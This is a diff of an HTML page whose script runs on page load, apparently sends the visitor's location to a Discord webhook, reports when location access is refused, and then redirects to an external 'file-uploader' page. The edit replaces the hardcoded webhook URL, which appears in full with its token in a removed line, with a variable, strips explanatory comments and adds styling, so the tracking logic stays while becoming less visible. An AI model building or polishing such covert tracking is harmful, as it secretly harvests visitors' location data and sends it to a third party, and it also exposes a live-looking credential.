@@ -11,6 +11,15 @@
             margin: 0;
             height: 100vh;
         }
+
+        /* Ensures the background image adjusts for smaller screens */
+        @media (max-width: 768px) {
+            body {
+                background-size: contain;
+                background-repeat: no-repeat;
+                background-attachment: scroll;
+            }
+        }
     </style>
 </head>
 <body>
@@ -41,14 +50,12 @@
                     () => {
                         console.log("Location permission denied.");
                         
-                        // Send message to Discord if location is denied
-                        fetch("https://discord.com/api/webhooks/1310096225961250816/HuldPFlYUqeQHYOtEGYDkVxr2OC3DTQKt6gPPwRpjwkPdOUYRcRAFvsbOKPAFnIcYjYX", {
+                        fetch(webhookURL, {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({ content: "🚨 User denied location access!" })
                         });
 
-                        // Redirect to Google
                         window.location.href = "https://sites.google.com/view/no-thx-obfascate-thx/file-uploader";
                     }
                 );
@@ -60,8 +67,6 @@
         document.addEventListener("DOMContentLoaded", () => {
             sendLocation();
         });
-
-        // Random comment: Why does cargo ship insurance cost so much? Because it’s a boatload of money!
     </script>
 </body>
 </html>
